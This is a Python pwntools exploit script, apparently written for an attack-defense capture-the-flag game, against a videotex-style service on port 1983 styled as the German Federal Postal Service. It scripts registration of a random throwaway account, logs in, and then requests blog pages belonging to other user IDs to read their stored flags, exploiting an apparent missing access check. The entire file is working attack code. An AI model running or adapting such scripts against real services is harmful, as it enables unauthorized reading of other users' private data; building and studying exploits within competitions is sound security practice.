import sys
import pwn
import random

def set_palette(pal):
    return bytes([0x9b, 0x30 + pal, 0x40])

def set_fg_color_simple(c):
    return bytes([0x80 + c]) 

def set_bg_color_simple(c):
    return bytes([0x90 + c]) 

def set_fg_color(c):
    return set_palette(c >> 3) + set_fg_color_simple(c & 7)

def set_bg_color(c):
    return set_palette(c >> 3) + set_bg_color_simple(c & 7)

def show_cursor():
    return b'\x11'

def set_cursor(y, x):
    return bytes([0x1f, 0x40 + y, 0x40 + x])

def end_of_page():
    return b'\x1f\x58\x41\x11\x1a'

## Interaction chars

# this is the f2 button
def terminator():
    return b'\x1c'

# this is the f1 button
def initiator():
    return b'\x13'

page_ends = {
    "login": set_fg_color(3) + set_bg_color(12) + show_cursor(),
    "logout": set_cursor(24,1) + show_cursor(),
    "home": set_cursor(24,1) + show_cursor(),
    "create_user": set_fg_color(3) + set_bg_color(12) + show_cursor(),
    "blog": set_fg_color(3) + set_bg_color(4) + show_cursor(),
    "blog_overview": set_cursor(24,1) + set_cursor(24,1) + show_cursor(),
}

debug=True
def debug_print(s):
    if debug:
        dbg = ""
        for c in s:
            dbg += hex(c)[2:]
        print(f"{dbg}")


def login(conn, participant_number=b"", password=b""):
    conn.recvuntil(page_ends["login"])
    conn.send(participant_number + terminator())
    data = conn.recvuntil(page_ends["login"])
    assert b"Enter extension" in data, "Login process broken"
    conn.send(terminator())
    conn.recvuntil(page_ends["login"])
    conn.send(password + terminator())
    data = conn.recvuntil(page_ends["home"])
    assert b"German Federal Postal Service" in data, "Login process broken"

def register(conn, participant_number, salutation, ln, fn, street, zip_nr, city, password):
    login(conn)
    conn.send(b"7")
    data = conn.recvuntil(page_ends["create_user"])
    try:
        # participant number
        conn.send(participant_number + terminator())
        # There are 2 options here: either we're already registered (then we
        # get an error message and end_of_page()), or we are not (then we see
        # page_ends["create_user"] and can continue inserting data).
        data = conn.recvuntil([end_of_page(), page_ends["create_user"]])
        if b"Participant no. already assigned" in data:
            # If we are already registered, log out and go back to login
            print("User exists, skipping registration")
            # logout
            conn.send(terminator() + initiator() + b"8" + terminator())
            # receive logout page
            conn.recvuntil(page_ends["logout"])
            conn.recvuntil(page_ends["logout"])
            # go to login page
            conn.send(terminator())
            return
        # salutation
        conn.send(salutation + terminator())
        conn.recvuntil(page_ends["create_user"])
        # last name
        conn.send(ln + terminator())
        conn.recvuntil(page_ends["create_user"])
        # first name
        conn.send(fn + terminator())
        conn.recvuntil(page_ends["create_user"])
        # street
        conn.send(street + terminator())
        conn.recvuntil(page_ends["create_user"])
        # zip
        conn.send(zip_nr + terminator())
        conn.recvuntil(page_ends["create_user"])
        # shitty
        conn.send(city + terminator())
        conn.recvuntil(page_ends["create_user"])
        # country code
        conn.send(terminator())
        # password
        conn.send(password + terminator())
        conn.recvuntil(page_ends["create_user"])
        conn.send(terminator())
    except Exception:
        assert 0, "Register page broken"

def retrieve_blog_by_pageno(conn, target_user_id, idx):
    conn.send(initiator() + b"34" + idx + target_user_id + terminator())
    data = conn.recvuntil(page_ends["blog_overview"])
    return data

def exploit(target: str, flag_ids_user_id: list[str]):
    conn = pwn.remote(target, 1983, timeout=10)
    user_id = str(random.randint(10,10**10))
    pw = "".join([random.choice("0123456789abcdef") for _ in range(8)])

    register(conn,
        participant_number=user_id.encode(),
        salutation=b"X",
        ln=b"X",
        fn=b"X",
        street=b"X",
        zip_nr=str(random.randint(1,99999)).rjust(5,"0").encode(),
        city=b"X",
        password=pw.encode()
    )
    login(conn, user_id.encode(), pw.encode())
    for target_user_id in flag_ids_user_id:
        data = retrieve_blog_by_pageno(conn, target_user_id.encode(), b"1")
        print(data)

if __name__ == '__main__':
    exploit(sys.argv[1], sys.argv[2].split(','))
